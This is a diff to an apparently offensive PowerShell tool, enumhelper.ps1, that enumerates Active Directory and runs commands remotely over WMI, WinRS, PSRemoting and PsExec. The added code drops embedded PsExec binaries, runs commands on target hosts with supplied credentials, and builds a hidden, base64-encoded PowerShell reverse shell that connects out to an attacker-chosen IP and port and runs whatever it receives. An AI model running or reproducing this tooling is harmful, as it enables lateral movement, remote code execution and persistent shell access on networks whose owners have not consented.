@@ -5,18 +5,12 @@
 #>
 #Parameters
 param (
-    #[Parameter(Mandatory=$true)]
-    #[string]$ldap_query,
 	[Parameter(Mandatory=$true)]
-    [string]$param1,
+    	[string]$param1,
 	
-	#[Parameter(Mandatory=$false)]
-	#[string]$ldap_property = "l",
 	[Parameter(Mandatory=$false)]
 	[string]$param2 = "l",
 	
-	#[Parameter(Mandatory=$false)]
-	#[string]$ldap_pasw)
 	[Parameter(Mandatory=$false)]
 	[string]$param3,
 	
@@ -84,16 +78,16 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   '<param1>' == 'dcinfo'     -->  Prints out DC name, hostname, OS, OS version, IPv4 and IPv6
   '<param1>' == 'deviceinfo' -->  Prints out AD devices' info: Name, hostname, OS, OS SP, OS version, 
                                   IPv4 and IPv6
-  '<param1>' == 'psexec'     --\  Write PsExec.exe or PsExec64.exe to disk.
-             == 'psexec64'   --/  Stored as base64 inside this script.
+  '<param1>' == 'psexec'     -->  Writes psexec or psexec64 binary to disk
+  '<param1>' == 'psexec64'   -'  
   
   For example:
   .\enumhelper.ps1 'spnlist'
   .\enumhelper.ps1 'dcinfo'
   .\enumhelper.ps1 'deviceinfo'
-  .\enumhelper.ps1 'psexec' 
+  .\enumhelper.ps1 'psexec'
   .\enumhelper.ps1 'psexec64'
-
+	  
 <------------------------------------------------------------------------------------------------------->
  
   Leveraging further with '<param2>':
@@ -125,61 +119,52 @@ if ($param1.ToUpper() -eq "HELP" -or $param1.ToUpper() -eq "H")
   For example:
   .\enumhelper.ps1 'psremote' 'adminusername' 'adminpassword' 'dc1.testad.local'
  
- With adding '<param5>' we can try to run remote commands over WMI or WINRS:
-  '<param1>' == 'wmi' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target IP
+ <------------------------------------------------------------------------------------------------------->
+ 
+ With adding '<param5>' we can try to run remote commands over WMI, WINRS OR PSEXEC/64:
+  '<param1>' == 'wmi' '<param2>' == 'username' '<param3>' == 'password'  '<param4>' == target IP
   '<param5>' == remote command to run
   or
   '<param1>' == 'winrs' '<param2>' == 'username'  '<param3>' == 'password'  '<param4>' == target hostname
+  '<param5>' == remote command to run
+  or
+  '<param1>' == 'psexec' '<param2>' == 'username' '<param3>' == password '<param4>' == target hostname/IP 
+  '<param5>' == remote command to run
+  or for the 64bit version
+  '<param1>' == 'psexec64' '<param2>' == 'username' '<param3>' == password '<param4>' == target hostname/IP 
   '<param5>' == remote command to run
   
   For example:
   .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'cmd'
   .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'cmd'
+  .\enumhelper.ps1 'psexec' 'user' 'pass' 'shadydest.local' 'cmd /c whoami'
+  .\enumhelper.ps1 'psexec64' 'user' 'pass' 'shadydest.local' 'cmd /c whoami'
   !NOTE: you can just run with 'wmi' or 'winrs' and the rest will be prompted.
-  
-  To further expand this we can also launch a prebuilt reverse shell command, you just need to enter:
+ 
+<------------------------------------------------------------------------------------------------------->
+ 
+  To further expand previous we can also launch a prebuilt reverse shell command, you just need to enter:
   '<param5>' == 'reverse-shell' '<param6>' == 'lhost IP' '<param7>' == 'lhost port' or use the same 
   param5 when prompted for a command:
   
   For example:
   .\enumhelper.ps1 'wmi' 'username' 'password' '192.168.12.34' 'reverse-shell' '192.168.23.45' '4444'
   .\enumhelper.ps1 'winrs' 'username' 'password' 'dc.testad.local' 'reverse-shell' '192.168.23.45' '4444'
-  
+  .\enumhelper.ps1 'psexec' 'username' 'password' 'host.testad.local' 'reverse-shell' '192.168.23.45' '4444'
+  .\enumhelper.ps1 'psexec64' 'username' 'password' '192.168.0.20' 'reverse-shell' '192.168.23.45' '4444'   
+
 <------------------------------------------------------------------------------------------------------->
  
   " -BackgroundColor Green -ForegroundColor Black
   exit
 }
-#Write PsExec to disk
-elseif ($param1.ToUpper() -eq "psexec" -or $param1.ToUpper() -eq 'psexec64')
-{
-	Write-Host "###-------------PSEXEC-WRITE------------------###" -ForegroundColor Yellow
-	Write-Host ""
-	if ($param1.ToUpper() -eq "psexec")
-	{
-		Write-Host "Writing PsExec.exe to disk..." -ForegroundColor Green
-		$filename = 'PsExec.exe'
-		$binary = [Convert]::FromBase64String($psexec_b64)
-	}
-	else
-	{
-		Write-Host "Writing PsExec64.exe to disk..." -ForegroundColor Green
-		$filename = 'PsExec64.exe'
-		$binary = [Convert]::FromBase64String($psexec64_b64)
-	}
-	Set-Content -Path $filename -Value $binary -Encoding Byte
-	Write-Host ""
-	Write-Host "###-----------PSEXEC-WRITE-DONE---------------###" -ForegroundColor Yellow
-	exit
-}
-#Run commands over WMI
-elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param1.ToUpper() -eq "PSREMOTE")
+elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param1.ToUpper() -eq "PSREMOTE" -or $param1.ToUpper() -eq "psexec" -or $param1.ToUpper() -eq 'psexec64')
 {
 	if ($param2 -ne "1" -and $param2 -and $param3)
 	{
 		$username = $param2
 		$insecure_password = $param3
-		if ($param1 -eq "WINRS")
+		if ($param1.ToUpper() -eq "WINRS" -or $param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
 		{
 			$password = $insecure_password
 		}
@@ -220,9 +205,15 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 				$computer = Read-Host -prompt 'Target hostname: '
 				$command = "fake_command"
 			}
+			elseif ($param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
+			{
+				$password = Read-Host -prompt 'Password: ' -AsSecureString
+				$computer = Read-Host -prompt 'Target (domain/)hostname or (domain/)IP: '
+				$command = Read-Host -prompt 'Command to run: '
+			}
 		}
 	}
-	#Run reverse shell command
+	#Build the reverse shell command
 	if ($command.ToUpper() -eq "REVERSE-SHELL")
 	{
 		if ($param6 -and $param7)
@@ -238,7 +229,16 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 		$rshell = '$client = New-Object System.Net.Sockets.TCPClient("'+$lhost+'",'+$lport+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 		$rshell_bytes = [System.Text.Encoding]::Unicode.GetBytes($rshell)
 		$encoded_rshell =[Convert]::ToBase64String($rshell_bytes)
-		$command = 'powershell -nop -w hidden -e ' + $encoded_rshell
+		#Because I was wasting too much time to figure out why calling powershell parameters over PsExec failed,
+		#putting it under good old cmd
+		if ($param1.ToUpper() -eq "psexec" -or $param1.ToUpper() -eq 'psexec64')
+		{
+			$command = 'cmd /c powershell.exe -nop -w hidden -e ' + $encoded_rshell
+		}
+		else
+		{
+			$command = 'powershell -nop -w hidden -e ' + $encoded_rshell
+		}
 	}
 	
 	Write-Host ""
@@ -247,6 +247,7 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 		try
 		{
 			$credential = New-Object System.Management.Automation.PSCredential $username, $password
+			#RUN OVER WMI
 			if ($param1.ToUpper() -eq "WMI")
 			{
 				Write-Host "###--------------WMIC-RUN--------------------###" -ForegroundColor Yellow
@@ -258,6 +259,7 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 					'ErrorAction'='Stop'}
 				$session = New-CimSession @params
 			}
+			#RUN OVER POWERSHELL REMOTE
 			elseif ($param1.ToUpper() -eq "PSREMOTE")
 			{
 				Write-Host "###--------------PSREMOTE--------------------###" -ForegroundColor Yellow
@@ -283,8 +285,8 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 				}
 				elseif ($output -like '*The*user*name*or*password*is*incorrect*')
 				{
-					Write-Host "Incorrect username/password!" -ForegroundColor Red
 					Write-Host ""
+					Write-Host "Incorrect username/password!" -ForegroundColor Red
 					exit
 				}
 				else
@@ -293,6 +295,7 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 				}
 				$this_session = (Get-PSSession).id.length-1
 				Enter-PSSession (Get-PSSession).id[$this_session]
+				Disconnect-PSSession (Get-PSSession).id[$this_session]
 				exit
 			}
 		}
@@ -331,6 +334,7 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 			$_.Exception.Message
 		}
 	}
+	#RUN OVER WINRS
 	elseif ($param1.ToUpper() -eq "WINRS")
 	{
 		Write-Host "###--------------WINRS-RUN--------------------###" -ForegroundColor Yellow
@@ -348,9 +352,83 @@ elseif ($param1.ToUpper() -eq "WMI" -or $param1.ToUpper() -eq "WINRS" -or $param
 		{
 			$output > tempfile
 		}
+		Write-Host ""
+		Write-Host "###--------------WINRS-DONE-------------------###" -ForegroundColor Yellow
 	}
-	Write-Host ""
-	Write-Host "###--------------WINRS-DONE-------------------###" -ForegroundColor Yellow
+	#Get PsExec.exe, PsExec64.exe or run a command with either
+	elseif ($param1.ToUpper() -eq "PSEXEC" -or $param1.ToUpper() -eq "PSEXEC64")
+	{
+		#Get the psexec binary
+		Write-Host "###-------------PSEXEC-WRITE------------------###" -ForegroundColor Yellow
+		Write-Host ""
+		if ($param1.ToUpper() -eq "PSEXEC")
+		{
+			if (-not (Test-Path "psexec.exe"))
+			{
+				Write-Host "Writing PsExec.exe to disk..." -ForegroundColor Green
+				$filename = 'PsExec.exe'
+				$binary = [Convert]::FromBase64String($psexec_b64)
+				Set-Content -Path $filename -Value $binary -Encoding Byte
+			}
+			else
+			{
+				Write-Host "The current folder already contains PsExec.exe" -ForegroundColor Green
+			}
+		}
+		else
+		{
+			if (-not (Test-Path "psexec64.exe"))
+			{
+				Write-Host "Writing PsExec64.exe to disk..." -ForegroundColor Green
+				$filename = 'PsExec64.exe'
+				$binary = [Convert]::FromBase64String($psexec64_b64)
+				Set-Content -Path $filename -Value $binary -Encoding Byte
+			}
+			else
+			{
+				Write-Host "The current folder already contains PsExec64.exe" -ForegroundColor Green
+			}
+		}
+		Write-Host ""
+		Write-Host "###-----------PSEXEC-WRITE-DONE---------------###" -ForegroundColor Yellow
+	
+		#RUN OVER PSEXEC
+		if ($username -ne "1")
+		{
+			$params=($command -split " ",2)[1]
+			$command=($command -split " ",2)[0]
+			Write-Host "###----------PSEXEC-RUN-COMMAND---------------###" -ForegroundColor Yellow
+			Write-Host ""
+			if ($param1.ToUpper() -eq "PSEXEC")
+			{
+				try
+				{
+					.\PsExec.exe \\$computer -u $username -p $password -i $command $params
+				}
+				catch
+				{
+					Write-Host ""
+					Write-Host "Your system doesn't support PsExec, try PsExec64" -ForegroundColor Red	
+				}
+
+			}
+			else
+			{
+				try
+				{
+					.\PsExec64.exe \\$computer -u $username -p $password -i $command $params
+				}
+				catch
+				{
+					Write-Host ""
+					Write-Host "Your system doesn't support PsExec64, try PsExec" -ForegroundColor Red
+				}
+			}
+			Write-Host ""
+			Write-Host "###--------PSEXEC-RUN-COMMAND-DONE------------###" -ForegroundColor Yellow
+		}
+		#}
+	}
 	exit
 }
 #Check the info for the DC
